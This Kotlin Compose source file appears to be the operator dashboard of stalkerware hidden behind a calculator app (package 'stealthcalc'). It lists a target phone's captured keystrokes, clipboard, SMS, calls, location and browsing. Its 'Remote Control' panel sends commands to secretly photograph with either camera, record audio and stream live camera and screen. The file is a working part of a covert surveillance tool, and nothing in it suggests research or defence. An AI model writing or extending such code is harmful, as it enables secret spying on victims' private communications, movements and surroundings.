package com.stealthcalc.monitoring.ui

import androidx.compose.foundation.background
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Apps
import androidx.compose.material.icons.filled.BatteryChargingFull
import androidx.compose.material.icons.filled.BatteryFull
import androidx.compose.material.icons.filled.CalendarMonth
import androidx.compose.material.icons.filled.Call
import androidx.compose.material.icons.filled.CameraFront
import androidx.compose.material.icons.filled.CameraRear
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material.icons.filled.DataUsage
import androidx.compose.material.icons.filled.GetApp
import androidx.compose.material.icons.filled.Image
import androidx.compose.material.icons.filled.Keyboard
import androidx.compose.material.icons.filled.Language
import androidx.compose.material.icons.filled.LocationOn
import androidx.compose.material.icons.filled.Mic
import androidx.compose.material.icons.filled.SimCard
import androidx.compose.material.icons.filled.Storage
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.PhoneAndroid
import androidx.compose.material.icons.filled.PhonelinkLock
import androidx.compose.material.icons.filled.Screenshare
import androidx.compose.material.icons.filled.VolumeUp
import androidx.compose.material3.OutlinedButton
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Sms
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.FilterChip
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DashboardScreen(
    onBack: () -> Unit,
    onNavigateToLiveScreen: () -> Unit = {},
    viewModel: DashboardViewModel = hiltViewModel(),
) {
    val state by viewModel.state.collectAsStateWithLifecycle()

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Dashboard") },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                actions = {
                    if (state.isLoading) {
                        CircularProgressIndicator(
                            modifier = Modifier.size(20.dp).padding(end = 8.dp),
                            strokeWidth = 2.dp,
                        )
                    }
                    IconButton(onClick = { viewModel.refresh() }) {
                        Icon(Icons.Default.Refresh, contentDescription = "Refresh")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.background,
                    titleContentColor = MaterialTheme.colorScheme.onBackground,
                )
            )
        }
    ) { padding ->
        if (!state.isPaired) {
            Box(
                modifier = Modifier.fillMaxSize().padding(padding),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    "Not paired. Go to Agent Config to set up.",
                    style = MaterialTheme.typography.bodyLarge,
                    color = MaterialTheme.colorScheme.onBackground.copy(alpha = 0.6f),
                    modifier = Modifier.padding(32.dp)
                )
            }
            return@Scaffold
        }

        LazyColumn(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(horizontal = 16.dp),
            verticalArrangement = Arrangement.spacedBy(10.dp),
        ) {
            item { Spacer(modifier = Modifier.height(2.dp)) }

            state.error?.let { error ->
                item {
                    Text(error, color = MaterialTheme.colorScheme.error, style = MaterialTheme.typography.bodyMedium)
                }
            }

            state.deviceState?.let { device ->
                item { DeviceStatusCard(device) }
                item { RemoteControlPanel(onNavigateToLiveScreen) { viewModel.sendCommand(it) } }
            }

            if (state.appUsage.isNotEmpty() && state.selectedTab == DashboardTab.ALL) {
                item { AppUsageSummary(state.appUsage) }
            }

            item { FilterChipRow(state.selectedTab) { viewModel.selectTab(it) } }

            if (state.parsedEvents.isEmpty() && !state.isLoading) {
                item {
                    Text(
                        "No events yet",
                        style = MaterialTheme.typography.bodyMedium,
                        color = MaterialTheme.colorScheme.onBackground.copy(alpha = 0.5f),
                        modifier = Modifier.padding(vertical = 16.dp)
                    )
                }
            }

            items(state.parsedEvents, key = { it.raw.id }) { parsed ->
                ParsedEventCard(parsed)
            }

            item { Spacer(modifier = Modifier.height(16.dp)) }
        }
    }
}

@Composable
private fun FilterChipRow(selected: DashboardTab, onSelect: (DashboardTab) -> Unit) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .horizontalScroll(rememberScrollState()),
        horizontalArrangement = Arrangement.spacedBy(8.dp),
    ) {
        DashboardTab.entries.forEach { tab ->
            FilterChip(
                selected = selected == tab,
                onClick = { onSelect(tab) },
                label = { Text(tab.label, style = MaterialTheme.typography.labelSmall) },
            )
        }
    }
}

@Composable
private fun DeviceStatusCard(device: com.stealthcalc.monitoring.model.DeviceState) {
    val isOnline = (System.currentTimeMillis() - device.lastSeen) < 5 * 60 * 1000L

    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(
                    modifier = Modifier
                        .size(10.dp)
                        .clip(CircleShape)
                        .background(if (isOnline) Color(0xFF4CAF50) else Color(0xFFBDBDBD))
                )
                Spacer(modifier = Modifier.width(8.dp))
                Icon(
                    Icons.Default.PhoneAndroid,
                    contentDescription = null,
                    modifier = Modifier.size(22.dp),
                    tint = MaterialTheme.colorScheme.primary
                )
                Spacer(modifier = Modifier.width(6.dp))
                Text(device.deviceName, style = MaterialTheme.typography.titleMedium)
                Spacer(modifier = Modifier.weight(1f))
                Text(
                    if (isOnline) "Online" else "Offline",
                    style = MaterialTheme.typography.labelSmall,
                    color = if (isOnline) Color(0xFF4CAF50) else MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.5f)
                )
            }

            Spacer(modifier = Modifier.height(12.dp))

            device.currentApp?.let { app ->
                InfoRow(Icons.Default.Apps, "Using $app")
            }

            device.batteryLevel?.let { level ->
                val icon = if (device.isCharging == true) Icons.Default.BatteryChargingFull else Icons.Default.BatteryFull
                val suffix = if (device.isCharging == true) " (charging)" else ""
                InfoRow(icon, "Battery $level%$suffix")
            }

            device.wifiSsid?.let { ssid ->
                InfoRow(Icons.Default.Wifi, ssid)
            }

            device.isScreenOn?.let { on ->
                InfoRow(Icons.Default.PhonelinkLock, if (on) "Screen on" else "Screen off")
            }

            Text(
                "Last seen: ${formatTimestamp(device.lastSeen)}",
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.5f),
                modifier = Modifier.padding(top = 6.dp)
            )
        }
    }
}

@Composable
private fun InfoRow(icon: ImageVector, text: String) {
    Row(
        verticalAlignment = Alignment.CenterVertically,
        modifier = Modifier.padding(vertical = 2.dp)
    ) {
        Icon(icon, contentDescription = null, modifier = Modifier.size(16.dp), tint = MaterialTheme.colorScheme.onSurfaceVariant)
        Text(text, style = MaterialTheme.typography.bodyMedium, modifier = Modifier.padding(start = 8.dp))
    }
}

@Composable
private fun AppUsageSummary(apps: List<AppUsageEntry>) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Text("Top Apps Today", style = MaterialTheme.typography.titleSmall)
            Spacer(modifier = Modifier.height(8.dp))

            val maxCount = apps.maxOfOrNull { it.foregroundCount } ?: 1
            apps.take(5).forEach { entry ->
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(vertical = 3.dp),
                    verticalAlignment = Alignment.CenterVertically,
                ) {
                    Text(
                        entry.appName,
                        style = MaterialTheme.typography.bodySmall,
                        modifier = Modifier.width(100.dp),
                        maxLines = 1,
                        overflow = TextOverflow.Ellipsis,
                    )
                    LinearProgressIndicator(
                        progress = entry.foregroundCount.toFloat() / maxCount,
                        modifier = Modifier
                            .weight(1f)
                            .height(8.dp)
                            .padding(horizontal = 8.dp),
                    )
                    Text(
                        "${entry.foregroundCount}x",
                        style = MaterialTheme.typography.labelSmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f),
                    )
                }
            }
        }
    }
}

@Composable
private fun ParsedEventCard(parsed: ParsedEvent) {
    val icon = when (parsed.icon) {
        "app" -> Icons.Default.Apps
        "notification" -> Icons.Default.Notifications
        "battery" -> Icons.Default.BatteryFull
        "network" -> Icons.Default.Wifi
        "screen" -> Icons.Default.PhonelinkLock
        "install" -> Icons.Default.GetApp
        "location" -> Icons.Default.LocationOn
        "call" -> Icons.Default.Call
        "sms" -> Icons.Default.Sms
        "media" -> Icons.Default.Image
        "security" -> Icons.Default.Security
        "clipboard" -> Icons.Default.ContentCopy
        "keystroke" -> Icons.Default.Keyboard
        "wifi" -> Icons.Default.Wifi
        "browser" -> Icons.Default.Language
        "sim" -> Icons.Default.SimCard
        "device" -> Icons.Default.Storage
        "data" -> Icons.Default.DataUsage
        "calendar" -> Icons.Default.CalendarMonth
        else -> Icons.Default.PhoneAndroid
    }

    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface)
    ) {
        Row(
            modifier = Modifier.padding(12.dp),
            verticalAlignment = Alignment.Top,
        ) {
            Icon(
                icon,
                contentDescription = null,
                modifier = Modifier
                    .size(20.dp)
                    .padding(top = 2.dp),
                tint = MaterialTheme.colorScheme.primary.copy(alpha = 0.7f)
            )
            Spacer(modifier = Modifier.width(10.dp))
            Column(modifier = Modifier.weight(1f)) {
                Text(
                    parsed.title,
                    style = MaterialTheme.typography.bodyMedium,
                    maxLines = 2,
                    overflow = TextOverflow.Ellipsis,
                )
                if (parsed.subtitle.isNotBlank()) {
                    Text(
                        parsed.subtitle,
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.6f),
                        maxLines = 2,
                        overflow = TextOverflow.Ellipsis,
                    )
                }
            }
            Text(
                formatTime(parsed.raw.capturedAt),
                style = MaterialTheme.typography.labelSmall,
                color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f),
            )
        }
    }
}

@Composable
private fun RemoteControlPanel(onLiveScreen: () -> Unit, onCommand: (String) -> Unit) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
    ) {
        Column(modifier = Modifier.padding(12.dp)) {
            Text("Remote Control", style = MaterialTheme.typography.titleSmall)
            Spacer(modifier = Modifier.height(8.dp))
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
            ) {
                OutlinedButton(onClick = onLiveScreen, modifier = Modifier.weight(1f)) {
                    Icon(Icons.Default.Screenshare, null, Modifier.size(16.dp))
                    Text(" Live", style = MaterialTheme.typography.labelSmall)
                }
                OutlinedButton(onClick = { onCommand("capture_front") }, modifier = Modifier.weight(1f)) {
                    Icon(Icons.Default.CameraFront, null, Modifier.size(16.dp))
                    Text(" Front", style = MaterialTheme.typography.labelSmall)
                }
            }
            Spacer(modifier = Modifier.height(4.dp))
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
            ) {
                OutlinedButton(onClick = { onCommand("capture_back") }, modifier = Modifier.weight(1f)) {
                    Icon(Icons.Default.CameraRear, null, Modifier.size(16.dp))
                    Text(" Back", style = MaterialTheme.typography.labelSmall)
                }
                OutlinedButton(onClick = { onCommand("record_audio") }, modifier = Modifier.weight(1f)) {
                    Icon(Icons.Default.Mic, null, Modifier.size(16.dp))
                    Text(" Audio", style = MaterialTheme.typography.labelSmall)
                }
            }
            Spacer(modifier = Modifier.height(4.dp))
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
            ) {
                OutlinedButton(onClick = { onCommand("stream_camera_front") }, modifier = Modifier.weight(1f)) {
                    Text("Live Front", style = MaterialTheme.typography.labelSmall)
                }
                OutlinedButton(onClick = { onCommand("stream_camera_back") }, modifier = Modifier.weight(1f)) {
                    Text("Live Back", style = MaterialTheme.typography.labelSmall)
                }
            }
            Spacer(modifier = Modifier.height(4.dp))
            OutlinedButton(
                onClick = { onCommand("ring") },
                modifier = Modifier.fillMaxWidth(),
            ) {
                Icon(Icons.Default.VolumeUp, null, Modifier.size(16.dp))
                Text(" Ring Phone", style = MaterialTheme.typography.labelSmall)
            }
        }
    }
}

private fun formatTimestamp(ms: Long): String {
    val sdf = java.text.SimpleDateFormat("MMM d, h:mm a", java.util.Locale.US)
    return sdf.format(java.util.Date(ms))
}

private fun formatTime(ms: Long): String {
    val sdf = java.text.SimpleDateFormat("h:mm a", java.util.Locale.US)
    return sdf.format(java.util.Date(ms))
}
